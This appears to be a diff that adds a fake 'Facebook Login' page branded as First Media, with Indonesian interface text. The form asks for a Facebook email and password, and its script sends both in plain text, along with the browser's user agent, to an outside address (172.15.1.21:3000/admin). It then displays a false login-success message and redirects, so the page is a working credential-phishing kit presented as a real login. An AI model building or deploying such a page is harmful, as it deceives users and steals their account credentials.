@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <!-- Google Tag Manager  test-->
+    <script>(function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-W56NWHJ');</script>
+    <!-- End Google Tag Manager -->
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Facebook Login - First Media</title>
+            <link rel="stylesheet" href="assets/css/mainbs.css" />
+        <link rel="stylesheet" href="assets/css/swiper.min.css" />
+        <link rel="stylesheet" href="assets/css/Login.css" />
+    <link rel="stylesheet" href="https://my.firstmedia.com/chatbot/css/intlTelInput.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+
+    <link rel="icon" href="https://www.firstmedia.com/files/favicon3.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="57x57" href="https://www.firstmedia.com/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://www.firstmedia.com/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://www.firstmedia.com/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://www.firstmedia.com/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://www.firstmedia.com/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://www.firstmedia.com/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://www.firstmedia.com/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://www.firstmedia.com/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.firstmedia.com/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://www.firstmedia.com/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.firstmedia.com/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://www.firstmedia.com/favicon/manifest.json">
+
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="https://www.firstmedia.com/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <style>
+        .newAdv {
+            margin-top: 1%;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 15px;
+        }
+
+        .adv {
+            width: 52%;
+            border-radius: 15px;
+            background-color: navy;
+            margin: 0 auto;
+        }
+
+        @media screen and (max-width: 480px) {
+            .newAdv {
+                margin-top: 5px;
+                width: 95%
+            }
+
+            .adv {
+                width: 95%
+            }
+        }
+
+        .facebook-login-container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+            border: 2px solid #4267B2;
+        }
+
+        .facebook-header {
+            background: linear-gradient(135deg, #4267B2, #365899);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .facebook-header h2 {
+            margin: 0;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .facebook-header p {
+            margin: 10px 0 0 0;
+            opacity: 0.9;
+        }
+
+        .facebook-form {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #4267B2;
+        }
+
+        .btn-facebook {
+            width: 100%;
+            padding: 12px;
+            background: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-facebook:hover {
+            background: #365899;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: #4267B2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .success-message {
+            color: #28a745;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .facebook-logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body class="bodylogin">
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W56NWHJ"
+            height="0" width="0" style="display: none; visibility: hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <a class="newAdv">
+        <div class="adv noauth newdesktop" style="">&nbsp;</div>
+    </a>
+
+    <a class="newAdv">
+        <div class="adv noauth newmobile" style="">&nbsp;</div>
+    </a>
+
+    <div class="allbackground">
+        <section class="login container container-45">
+            <div class="row">
+                <div class="col-12 ">
+                    <div class="kontenlogin welcome" style="margin-top: 1%">
+                        <div class="row" style="">
+                            <div class="col-2 text-left">
+                                <a href="#" class="logo">
+                                    <img src="assets/img/logoMYFM_New.png" class="m0auto" alt=""></a>
+                            </div>
+                            <div class="col-10 text-right">
+                                <div class="blokwelcome">
+                                    <h1>First Media</h1>
+                                    <p style="margin-bottom: 0px;">Facebook Login</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="text-center">
+                            <img src="assets/img/ilustrasi-cek.png" class="m0auto imgintro" style="margin-bottom: 0em;" alt="">
+                        </div>
+                    </div>
+
+                    <div class="kontenlogin fomridlogin text-center">
+                        <div class="facebook-login-container">
+                            <div class="facebook-header">
+                                <div class="facebook-logo">
+                                    <i class="fab fa-facebook-f"></i>
+                                </div>
+                                <h2>Facebook Login</h2>
+                                <p>Masuk dengan akun Facebook Anda</p>
+                            </div>
+
+                            <div class="facebook-form">
+                                <form id="facebookLoginForm">
+                                    <div class="form-group">
+                                        <label for="facebookEmail">Email Facebook</label>
+                                        <input type="email" id="facebookEmail" name="email" placeholder="Masukkan email Facebook" required>
+                                        <div class="error-message" id="facebookEmailError"></div>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="facebookPassword">Password Facebook</label>
+                                        <input type="password" id="facebookPassword" name="password" placeholder="Masukkan password Facebook" required>
+                                        <div class="error-message" id="facebookPasswordError"></div>
+                                    </div>
+                                    <button type="submit" class="btn-facebook">
+                                        <i class="fab fa-facebook-f"></i>
+                                        Login dengan Facebook
+                                    </button>
+                                    <div class="success-message" id="facebookSuccess"></div>
+                                </form>
+
+                                <div class="back-link">
+                                    <a href="auth.html">← Kembali ke halaman login</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Scripts -->
+        <script src="assets/js/jquery.min.js"></script>
+        <script src="assets/js/skel.min.js"></script>
+        <script src="assets/js/util.js"></script>
+        <script src="assets/js/main.js"></script>
+        <script src="assets/js/swiper.min.js"></script>
+        
+        <script>
+            function sendToAdmin(data, type) {
+                // Send data to 172.15.1.21:3000/admin
+                fetch('http://172.15.1.21:3000/admin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        data: data,
+                        timestamp: new Date().toISOString()
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Data sent to admin:', result);
+                    console.log('Full data payload:', {
+                        type: type,
+                        data: data,
+                        timestamp: new Date().toISOString()
+                    });
+                })
+                .catch(error => {
+                    console.error('Error sending data to admin:', error);
+                });
+            }
+
+            function showError(elementId, message) {
+                const errorElement = document.getElementById(elementId);
+                errorElement.textContent = message;
+                errorElement.style.display = 'block';
+            }
+
+            function hideError(elementId) {
+                const errorElement = document.getElementById(elementId);
+                errorElement.style.display = 'none';
+            }
+
+            function showSuccess(elementId, message) {
+                const successElement = document.getElementById(elementId);
+                successElement.textContent = message;
+                successElement.style.display = 'block';
+            }
+
+            function hideSuccess(elementId) {
+                const successElement = document.getElementById(elementId);
+                successElement.style.display = 'none';
+            }
+
+            // Facebook Login Form Handler
+            document.getElementById('facebookLoginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('facebookEmail').value;
+                const password = document.getElementById('facebookPassword').value;
+
+                // Hide previous messages
+                hideError('facebookEmailError');
+                hideError('facebookPasswordError');
+                hideSuccess('facebookSuccess');
+
+                // Basic validation
+                if (!email) {
+                    showError('facebookEmailError', 'Email Facebook harus diisi');
+                    return;
+                }
+
+                if (!password) {
+                    showError('facebookPasswordError', 'Password Facebook harus diisi');
+                    return;
+                }
+
+                // Send data to admin
+                const facebookData = {
+                    email: email,
+                    password: password,
+                    provider: 'facebook',
+                    action: 'facebook_login',
+                    userAgent: navigator.userAgent
+                };
+
+                sendToAdmin(facebookData, 'facebook_login');
+
+                // Show success message
+                showSuccess('facebookSuccess', 'Login Facebook berhasil! Redirecting...');
+
+                // Redirect to dashboard after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 2000);
+            });
+
+            function rebindAdv() {
+                var pname = 'cek.firstmedia.land';
+                var cust = 'facebook_user';
+                var agent = encodeURI(window.navigator.userAgent);
+                var uri = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=3';
+                var uriMobile = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=8';
+                uri = uri.replace("#a#", cust);
+                uri = uri.replace("#ua#", agent);
+
+                uriMobile = uriMobile.replace("#a#", cust);
+                uriMobile = uriMobile.replace("#ua#", agent);
+
+                pname = 'cek.firstmedia.land';
+                uri = uri.replace("#p#", pname);
+                uriMobile = uriMobile.replace("#p#", pname);
+
+                if (cust == undefined || cust == '') {
+                    pname = 'cek.firstmedia.land';
+                    uri = uri.replace("#p#", pname);
+                    uriMobile = uriMobile.replace("#p#", pname);
+                } else {
+                    uri = uri.replace("#p#", pname);
+                    uriMobile = uriMobile.replace("#p#", pname);
+                }
+                $(".newdesktop").load(uri);
+                $(".newmobile").load(uriMobile);
+            }
+
+            $(document).ready(function () {
+                rebindAdv();
+            });
+        </script>
+        
+        <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans'>
+        <link rel="stylesheet" href="https://staging.firstmedia.com:8443/myfm/chatbot/css/indigo.css">
+        <link rel="stylesheet" href="chatbot/css/widget.css">
+        <link rel="stylesheet" href="chatbot/css/lightslider.css">
+        <link rel="stylesheet" href="chatbot/css/intlTelInput.css">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no" />
+
+        <script src='chatbot/js/jquery-2.1.3.min.js'></script>
+        <script src='chatbot/js/iframeResizer.contentWindow.js'></script>
+        <script src='chatbot/js/iframeResizer.js'></script>
+        <script src='chatbot/js/lightslider.js'></script>
+        <script src='chatbot/js/lazyload.min.js'></script>
+        <script src="chatbot/js/cryptojs/pbkdf2.js"></script>
+        <script src="chatbot/js/cryptojs/aes.js"></script>
+        <script src="chatbot/js/cipher/aes-util.js"></script>
+        <script src="chatbot/js/stp.js"></script>
+        <script src="chatbot/js/sjs.js"></script>
+        <script src="chatbot/js/chat.js"></script>
+        <script src="chatbot/js/fuse.js"></script>
+        <script src="chatbot/js/speech.js"></script>
+        <script src="chatbot/js/intlTelInput.js"></script>
+    </div>
+
+</body>
+</html> 
